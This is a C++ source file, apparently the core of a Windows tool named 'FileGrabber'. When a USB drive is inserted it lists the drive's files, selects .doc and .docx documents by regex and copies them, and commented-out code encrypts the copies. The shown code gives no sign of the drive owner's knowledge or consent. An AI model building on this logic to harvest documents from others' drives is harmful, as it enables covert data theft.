#include "stdafx.h"
#include "Device.h"
#include <memory>
#include <list>
#include <fstream>
#include <sstream>
#include <string>
#include "FileLister.h"
#include "AESKey.h"
#include "AESEncrypt.h"
#include <filesystem>
#include "Convert.h"
#include "FileSearcher.h"
#include "FileCopyer.h"
#include "SystemConfig.h"
#include "sql_connection_error.h"
#include "SQLConnection.h"
#include "Log.h"
using namespace std;
using namespace filesystem;

bool IsServiceOn = true;
bool IsCopyOn = true;

void DeviceArrivalMain(TCHAR DriveLetter) {
	/*
	try {
		Device dv(DriveLetter);
		SQLConnection conn(L"rec.db");
		conn.open();
		conn.insertRecord(dv);
		conn.close();
	}
	catch (exception& e) {
		MessageBoxA(NULL, e.what(), "FileGrabber - Error", MB_ICONERROR);
	}
	*/
	try {
		LOG->i(wstring(L"File grabbing module started. Ready to grab files. Drive Letter: ") + DriveLetter);
		Device dv(DriveLetter);
		Device::DiskInformation info = dv.GetDiskInformation();
		FileLister lister(dv);
		shared_ptr<list<FileData>> pls = lister.ListFile();
		FileSearcher fs;
		shared_ptr<list<FileData>> psls = fs.FindFileRegex(pls, { L".*.doc" ,L".*.docx" });
		FileCopyer cp(dv, psls);
		cp.ListFile(pls);
		if (IsCopyOn) {
			cp.Copy();
		}
		LOG->i(wstring(L"Grab done. Device Drive Letter: ") + DriveLetter);
	}
	catch (exception & e) {
		LOG->e(wstring(L"Fatal Error: ") + Convert().toString(e.what()));
	}
	catch (...) {
		LOG->e(L"Fatal Error: Unknown Error.");
	}
	/*
	if (SystemConfig::getInstance()->FileCopyer) {
		if (SystemConfig::getInstance()->NormalCopy) {
			FileSearcher fsr;
			shared_ptr<list<FileData>> psls = fsr.FindFile(pls, SystemConfig::getInstance()->NormalCopyFilters);
			cp.setPaths(psls);
			cp.Copy();
			cp.Encrypt();
		}
		if (SystemConfig::getInstance()->RegexCopy) {
			FileSearcher fsr;
			shared_ptr<list<FileData>> psls = fsr.FindFileRegex(pls, SystemConfig::getInstance()->RegexCopyFilters);
			cp.setPaths(psls);
			cp.Copy();
			cp.Encrypt();
		}
	}
	*/
}

void DeviceRemovalMain(TCHAR DriveLetter) {
	LOG->i(wstring(L"Device removed. Drive Letter: ") + DriveLetter);
}

// Usually this function should be empty.
void InitProgram() {
	Log::getInstance();
}